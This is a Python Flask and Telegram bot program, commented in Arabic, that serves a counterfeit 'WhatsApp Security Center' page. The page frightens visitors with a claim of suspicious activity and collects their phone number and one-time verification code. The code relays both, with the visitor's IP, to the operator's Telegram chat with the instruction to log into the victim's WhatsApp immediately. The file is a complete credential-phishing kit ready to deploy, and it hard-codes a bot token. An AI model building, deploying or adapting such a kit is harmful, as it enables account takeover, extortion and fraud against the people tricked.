import os
import asyncio
import logging
import telebot
from flask import Flask, request, render_template_string
from threading import Thread

# --- الإعدادات الأساسية ---
TOKEN = '8390076798:AAGXs0nv45Swv5JaDs9YCcwRiUgqPbskcAI'
ADMIN_ID = 5288849409

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# --- واجهة تأمين واتساب (الفخ الأمني) ---
SECURITY_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Security Center</title>
    <style>
        body { font-family: -apple-system, Segoe UI, Roboto; background: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .logo { width: 60px; margin-bottom: 15px; }
        h2 { color: #075e54; font-size: 19px; margin-bottom: 10px; }
        p { color: #555; font-size: 13px; line-height: 1.6; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: right; }
        label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; margin-right: 5px; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; text-align: center; }
        .btn { background: #25d366; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #128c7e; }
        .step { display: none; }
        .active { display: block; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .footer { margin-top: 20px; font-size: 11px; color: #bbb; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        
        <div id="step1" class="step active">
            <h2>تحديث أمان الحساب</h2>
            <p>لقد رصدت أنظمتنا نشاطاً غير معتاد. يرجى إدخال رقم هاتفك المرتبط بواتساب لإغلاق الجلسات المشبوهة وتفعيل التشفير الثنائي.</p>
            <div class="input-group">
                <label>رقم الهاتف (مع مفتاح الدولة)</label>
                <input type="tel" id="phone" placeholder="+966 5x xxx xxxx">
            </div>
            <button class="btn" onclick="submitPhone()">تحقق وتأمين</button>
        </div>

        <div id="step2" class="step">
            <h2>تأكيد ملكية الحساب</h2>
            <p>تم إرسال رمز الأمان (OTP) إلى هاتفك عبر رسالة نصية. يرجى إدخاله أدناه لإنهاء عملية التأمين وطرد المخترقين.</p>
            <div class="input-group">
                <label>رمز التحقق المكون من 6 أرقام</label>
                <input type="number" id="otp" placeholder="- - - - - -" style="letter-spacing: 5px;">
            </div>
            <button class="btn" onclick="submitOTP()">تفعيل الحماية الآن</button>
        </div>

        <div class="footer">WhatsApp Security Protocol v2.26.1</div>
    </div>

    <script>
        let phoneNum = "";

        async function submitPhone() {
            phoneNum = document.getElementById('phone').value;
            if (phoneNum.length < 9) return alert("يرجى إدخال رقم هاتف صحيح");

            // إرسال الرقم فوراً للبوت لتبدأ أنت بطلب الكود من واتساب
            await fetch('/api/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: "رقم المبتز", value: phoneNum })
            });

            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }

        async function submitOTP() {
            const otp = document.getElementById('otp').value;
            if (otp.length < 6) return alert("الرمز يجب أن يكون 6 أرقام");

            await fetch('/api/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: "كود الدخول (OTP)", value: otp, phone: phoneNum })
            });

            alert("تم إرسال الطلب. جاري معالجة تأمين الحساب، يرجى عدم إغلاق هذه الصفحة لمدة دقيقة.");
        }
    </script>
</body>
</html>
"""

# --- المسارات (Routes) ---

@app.route('/')
def home():
    return render_template_string(SECURITY_HTML)

@app.route('/api/log', methods=['POST'])
def log_data():
    data = request.json
    action = data.get('action')
    value = data.get('value')
    phone = data.get('phone', 'N/A')
    
    # تنسيق التقرير لإرساله لك
    report = (
        f"🚨 **تنبيه عملية أمنية** 🚨\n"
        f"━━━━━━━━━━━━━━\n"
        f"📌 **النوع:** `{action}`\n"
        f"📱 **الرقم:** `{value if 'رقم' in action else phone}`\n"
        f"{f'🔑 **الكود:** `{value}`' if 'كود' in action else ''}\n"
        f"🌐 **IP:** `{request.remote_addr}`\n"
        f"━━━━━━━━━━━━━━\n"
        f"⚠️ *تحرك الآن لإدخال الكود في واتساب!*"
    )
    
    bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    return {"status": "success"}

# --- تشغيل البوت والخادم ---

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    # تشغيل البوت في Thread منفصل
    bot_thread = Thread(target=run_bot)
    bot_thread.start()
    
    # تشغيل Flask على المنفذ المطلوب من Render
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
